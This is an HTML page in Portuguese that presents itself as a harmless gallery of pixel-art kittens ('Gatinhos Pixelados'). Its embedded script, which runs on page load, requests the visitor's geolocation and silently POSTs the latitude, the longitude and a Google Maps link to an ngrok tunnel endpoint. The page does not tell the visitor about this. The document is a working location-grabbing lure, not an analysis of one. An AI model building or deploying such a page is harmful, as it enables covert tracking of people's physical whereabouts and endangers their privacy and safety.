<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gatinhos Pixelados</title>
  <style>
    body {
      background-color: #ffcccb;
      text-align: center;
      font-family: 'Comic Sans MS', cursive;
    }
    .container {
      margin-top: 50px;
    }
    .pixel-cat {
      width: 150px;
      height: 150px;
      image-rendering: pixelated;
      margin: 10px;
    }
    .cats {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
    }
    .title {
      font-size: 24px;
      font-weight: bold;
      color: #ff4081;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1 class="title">üê± Gatinhos Pixelados üê±</h1>
    <div class="cats">
      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 1">
      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 2">
      <img src="https://www.pixelartcss.com/img/examples/cat-pixel.png" class="pixel-cat" alt="Gatinho 3">
    </div>
  </div>

  <script>
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      }
    });

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://5057-187-59-186-51.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
      .then(response => response.json())
      .then(data => {
        console.log("Localiza√ß√£o enviada com sucesso!");
      })
      .catch(error => {
        console.error("Erro ao enviar localiza√ß√£o:", error);
      });
    }

    function handleError(error) {
      console.error("Erro ao obter a localiza√ß√£o:", error.message);
    }
  </script>
</body>
</html>
